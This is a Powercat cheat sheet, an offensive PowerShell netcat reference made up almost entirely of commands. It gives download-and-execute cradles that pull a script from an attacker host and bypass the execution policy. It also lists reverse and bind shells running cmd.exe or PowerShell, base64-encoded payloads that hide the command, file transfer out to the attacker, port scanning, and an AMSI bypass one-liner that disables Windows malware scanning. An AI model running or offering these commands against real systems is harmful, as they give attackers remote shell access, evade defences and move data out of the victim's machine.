---
title: "Powercat CHEATSHEET"
description: "Quick reference for Powercat PowerShell netcat commands"
---

# Powercat CHEATSHEET

## Installation

```powershell
# Import directly from URL
IEX (New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')

# Download and import
Invoke-WebRequest -Uri "http://ATTACKER_IP/powercat.ps1" -OutFile "C:\Temp\powercat.ps1"
. .\powercat.ps1

# Bypass execution policy
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1')"
```

## Reverse Shells

```powershell
# Basic reverse shell
powercat -c ATTACKER_IP -p 4444 -e cmd.exe

# PowerShell reverse shell
powercat -c ATTACKER_IP -p 4444 -e powershell.exe

# Encoded command
$cmd = 'powercat -c ATTACKER_IP -p 4444 -e cmd.exe'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -enc $encoded

# With DNS resolution
powercat -c dns.domain.com -p 4444 -e cmd.exe -dns

# With timeout
powercat -c ATTACKER_IP -p 4444 -e cmd.exe -t 10
```

## Bind Shells

```powershell
# Target listens
powercat -l -p 4444 -e cmd.exe

# Attacker connects
nc 192.168.1.100 4444
```

## Port Scanning

```powershell
powercat -c 192.168.1.1 -p 1-1000 -o       # TCP scan
powercat -c 192.168.1.1 -p 53,80,443 -o     # Specific ports
```

## File Transfer

```powershell
# Send file to attacker
powercat -c ATTACKER_IP -p 4444 -i C:\path\file.txt

# Receive file from attacker
powercat -l -p 4444 -i C:\path\save\file.txt

# Receiver side (attacker)
nc -lvnp 4444 > received_file.txt
```

## UDP Mode

```powershell
powercat -c ATTACKER_IP -p 4444 -u          # UDP reverse shell
powercat -l -p 4444 -u                      # UDP listener
```

## Relay Mode

```powershell
powercat -c ATTACKER_IP -p 4444 -ep 5555 -r
```

## AMSI Bypass

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Common Flags

| Flag | Description |
|------|-------------|
| `-c HOST` | Connect to host |
| `-p PORT` | Port number |
| `-l` | Listen mode |
| `-e CMD` | Execute command |
| `-i FILE` | Input file |
| `-o FILE` | Output file |
| `-u` | UDP mode |
| `-dns` | Use DNS for hostname resolution |
| `-t SECS` | Connection timeout |
| `-r` | Relay mode |
| `-ep PORT` | Endpoint port for relay |

## Quick Payloads (One-Liners)

```powershell
# Download and execute
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1');powercat -c ATTACKER_IP -p 4444 -e cmd.exe"

# Encoded payload
$pc="powercat -c ATTACKER_IP -p 4444 -e cmd.exe";$e=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pc));powershell -enc $e
```
